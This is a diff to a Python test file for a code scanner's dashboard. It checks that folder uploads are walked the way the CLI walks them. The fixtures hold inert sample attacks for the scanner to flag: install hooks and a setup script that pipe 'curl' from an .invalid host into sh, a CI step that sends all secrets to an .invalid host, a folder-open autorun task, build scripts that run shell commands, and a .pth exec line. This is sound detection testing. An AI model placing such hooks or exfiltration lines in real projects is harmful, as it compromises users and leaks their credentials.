@@ -8,23 +8,30 @@ holding them, lazaret.scanner.core's project scan, every field of it and of ever
 list and time, and the CLI's project path and time):
 
 * the fixture projects (tests/fixtures: each a scan, its tree uploaded as paths; the trees the CLI's walk prunes
-  are left out, as the page has no walk) and the page's own "Load sample" inputs, pasted;
+  are left out, as an upload of files is not walked) and the page's own "Load sample" inputs, pasted;
+* the fixture projects whole, and trees that reach each step of the CLI's walk (a dependency's tree, a venv, Go's and
+  cargo's vendor trees, .git and the trees --exclude names, __pycache__ folders, CI files and an editor's settings
+  read by their paths, a file that can't be read), each
+  uploaded as a folder: the page walks it as `lazaret <folder>` does (lib/collect.js walkSteps and takeStep, BR-7
+  step 5's folder uploads);
 * uploads the CLI's collection reads each its own way: encodings (UTF-16 with and without a BOM, coding cookies,
   CRLF), a .pth file, a .pyw script, Go and Rust sources (N-14), a script without an extension, a program under a
   source file's name, an image, a video named .ts, an AppleDouble file, a config file holding a credential, an
   empty file, a name outside ASCII;
 * a control: a page that grades differently is caught.
 
-Not compared: what the page does not do (a directory walk: links, unreadable entries, pruned trees, dependency
-trees; following a package.json's install hooks into the files they run), and its size limit
+Not compared: what a browser does not give the page (links, special files, folders it could not list), what the
+page does not do (following a package.json's install hooks into the files they run; --deps), and its size limit
 (test_review_dashboard_limits). All content is inert: nothing is executed, hosts are TEST-NET or .invalid, the
 credential is a dummy built in pieces (test_fixture_credentials).
 """
 
+import importlib.util
 import os
 import tempfile
 import unittest
 
+from lazaret.scanner import core
 from tests import _support
 from tests.scanner import _dashboard_vm as dash
 
@@ -93,6 +100,52 @@ UPLOADS = [
 ]
 
 
+_PYC = importlib.util.MAGIC_NUMBER + bytes(12) + b"\xe3" + bytes(40)    # a .pyc of this Python, its code inert
+_HOOK = '{"name": "w", "version": "1.0.0", "scripts": {"postinstall": "curl -s https://x.invalid/i | sh"}}\n'
+
+#: (name, [(rel, bytes or text)]): trees that reach each step of the CLI's walk, uploaded as folders
+FOLDERS = [
+    ("dependency trees", [("app.py", "import os\nos.system(input())\n"),
+                          ("node_modules/left/index.js", "eval(process.argv[2]);\n"),
+                          ("node_modules/left/package.json", _HOOK),
+                          ("venv/pyvenv.cfg", "home = /usr/bin\n"), ("venv/lib/site.py", "eval(x)\n"),
+                          ("env/run.py", "exec(y)\n"),                       # (no pyvenv.cfg: a folder like any)
+                          ("bower_components/x/x.js", "eval(z)\n")]),
+    ("go vendor tree", [("go.mod", "module example.invalid/m\n\ngo 1.22\n"),
+                        ("main.go", 'package main\n\nimport "example.invalid/dep"\n\nfunc main() { dep.Run() }\n'),
+                        ("vendor/modules.txt", "# example.invalid/dep v1.0.0\n## explicit\nexample.invalid/dep\n"),
+                        ("vendor/example.invalid/dep/dep.go",
+                         'package dep\n\nimport "os/exec"\n\nfunc init() { exec.Command("sh", "-c", "id").Run() }\n\n'
+                         'func Run() {}\n'),
+                        ("vendor/example.invalid/dep/dep_test.go", "package dep\n")]),
+    ("cargo vendor tree", [("Cargo.toml", '[package]\nname = "m"\nversion = "0.1.0"\n'),
+                           ("src/main.rs", "fn main() {}\n"),
+                           ("vendor/dep/.cargo-checksum.json", '{"files": {}, "package": null}\n'),
+                           ("vendor/dep/Cargo.toml", '[package]\nname = "dep"\nversion = "1.0.0"\n'),
+                           ("vendor/dep/build.rs", 'use std::process::Command;\nfn main() {\n'
+                                                   '    Command::new("sh").arg("-c").arg("id").status().unwrap();\n}\n'),
+                           ("vendor/dep/src/lib.rs", "pub fn f() {}\n")]),
+    (".git and the opt-in trees", [(".git/HEAD", "ref: refs/heads/main\n"), (".git/config", "[core]\n"),
+                        (".hidden/x.py", "eval(a)\n"), ("dist/bundle.js", "eval(b)\n"), ("build/x.py", "eval(c)\n"),
+                        ("migrations/0001_initial.py", "eval(d)\n"), ("src/ok.py", "x = 1\n")]),
+    ("__pycache__", [("m.py", "x = 1\n"), ("__pycache__/m.cpython-312.pyc", _PYC),
+                     ("__pycache__/gone.cpython-312.pyc", _PYC), ("__pycache__/junk.pyc", b"not a pyc"),
+                     ("__pycache__/notes.txt", "x\n"), ("pkg/__init__.py", ""),
+                     ("pkg/__pycache__/__init__.cpython-312.pyc", _PYC)]),
+    ("nested", [("a/b/c/d.py", "import os\nos.system(input())\n"), ("a/b/package.json", _HOOK),
+                ("a/b/hook.pth", b"import os; exec(bytes.fromhex('7072696e74283129').decode())\n"),
+                ("a/.env", f"STRIPE_KEY=sk_live_{SECRET}\n"), ("a/b/c/\u00e9t\u00e9.js", "eval(q)\n"),
+                ("z.py", "eval(w)\n"), ("Z.py", "exec(w)\n"), ("_.py", "x = 2\n")]),
+    ("ci files and settings, by their paths", [
+        (".github/workflows/ci.yml", "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
+                                     "      - run: echo \"${{ toJSON(secrets) }}\" | curl -d @- https://x.invalid/c\n"),
+        (".gitlab-ci.yml", "build:\n  script:\n    - echo ok\n"),
+        (".vscode/tasks.json", '{"version": "2.0.0", "tasks": [{"label": "s", "type": "shell", "command": "node setup.js",'
+                               ' "runOptions": {"runOn": "folderOpen"}}]}\n'),
+        ("setup.js", "require('child_process').exec('curl -s https://x.invalid/i | sh');\n")]),
+]
+
+
 @dash.requires_node
 class ParityTests(unittest.TestCase):
     @classmethod
@@ -106,10 +159,13 @@ class ParityTests(unittest.TestCase):
         cls.pages = dash.run([dash.scan_request(files) for _, files in cls.projects]
                              + [dash.scan_request(paste=text, lang=lang) for text, lang in cls.samples], timeout=40)
 
-    def same(self, page, cli, files):
+    def same(self, page, cli, files, walked=False):
         self.assertNotIn("error", page, page.get("error"))
         self.assertEqual(page["generatedBy"], "lazaret-dashboard-2")
-        self.assertEqual(page["files"], sorted(rel for rel, _ in files))
+        if walked:                                       # (a folder: the files its walk read)
+            self.assertLessEqual(set(page["files"]), {rel for rel, _ in files})
+        else:
+            self.assertEqual(page["files"], sorted(rel for rel, _ in files))
         self.assertEqual(cli.get("warnings", []), [])
         page, cli = dash.comparable(page, dash.PAGE_ONLY), dash.comparable(cli, dash.CLI_ONLY)
         self.assertEqual(sorted(page), sorted(cli))
@@ -168,6 +224,57 @@ class ParityTests(unittest.TestCase):
                     got = dash.scan(files, html=path)
                 with self.assertRaises(AssertionError):
                     self.same(got, dash.cli_result(files), files)
+
+
+@dash.requires_node
+class FolderTests(unittest.TestCase):
+    """A folder upload is walked as `lazaret <folder>` walks it."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.folders = [(name, os.path.join(_support.FIXTURES, name), dash.tree_files(os.path.join(_support.FIXTURES, name)))
+                       for name, _ in fixture_projects() if name != "fixtures"] + [(n, None, f) for n, f in FOLDERS]
+        cls.pages = dash.run([dash.folder_request(files) for _, _, files in cls.folders], timeout=40)
+
+    same = ParityTests.same
+
+    def test_folders(self):
+        self.assertGreater(len(self.folders), 15)
+        for (name, root, files), page in zip(self.folders, self.pages):
+            with self.subTest(name):
+                cli = core.scan_project(root) if root else dash.cli_result(files)
+                self.same(page, cli, files, walked=True)
+
+    def test_the_walks_steps_are_reached(self):
+        rules = {i["rule"] for page in self.pages for i in page.get("issues", [])}
+        for rule in ("Q-SKIPPED-TREE", "SC-PYC-ORPHAN", "SC-INSTALL-HOOK", "SC-PTH-EXEC", "S-SECRET", "S-OSCMD-PY",
+                     "SC-WORKFLOW-SECRETS", "SC-AUTORUN"):
+            with self.subTest(rule):
+                self.assertIn(rule, rules)
+        pages = dict(zip([n for n, _, _ in self.folders], self.pages))
+        self.assertNotIn("node_modules/left/index.js", pages["dependency trees"]["files"])
+        self.assertIn("env/run.py", pages["dependency trees"]["files"])
+        # (without --deps a vendor tree is a dependency's: counted, not read)
+        self.assertEqual(pages["go vendor tree"]["files"], ["go.mod", "main.go"])
+        self.assertEqual(pages["cargo vendor tree"]["files"], ["Cargo.toml", "src/main.rs"])
+        for name in ("go vendor tree", "cargo vendor tree"):
+            self.assertEqual([i["file"] for i in pages[name]["issues"] if i["rule"] == "Q-SKIPPED-TREE"], ["vendor"])
+        self.assertEqual(pages[".git and the opt-in trees"]["files"],   # (.git never; the rest unless excluded)
+                         [".hidden/x.py", "build/x.py", "dist/bundle.js", "migrations/0001_initial.py", "src/ok.py"])
+        self.assertEqual(pages["nested"]["files"][:2], ["Z.py", "_.py"])            # (by code point, as the CLI)
+
+    def test_a_file_that_cannot_be_read(self):
+        files = [("a.py", "eval(x)\n"), ("b/c.py", "x = 1\n")]
+        page = dash.run([dash.folder_request(files, unreadable={"b/c.py"})])[0]
+        self.assertNotIn("error", page, page.get("error"))
+        unread = [i for i in page["issues"] if i["file"] == "b/c.py"]
+        self.assertEqual([i["rule"] for i in unread], ["Q-UNREADABLE"], unread)
+        self.assertIn("The requested file could not be read", unread[0]["msg"])
+        self.assertIn("S-EVAL-PY", {i["rule"] for i in page["issues"] if i["file"] == "a.py"})
+
+    def test_what_the_page_lists(self):
+        got = dash.run([{"op": "folder", "folder": dash.folder_request(dict(FOLDERS)["dependency trees"])["folder"]}])
+        self.assertIn("<b>project:</b> 2 file(s) to scan, 3 folder(s) not read", got[0])
 
 
 if __name__ == "__main__":
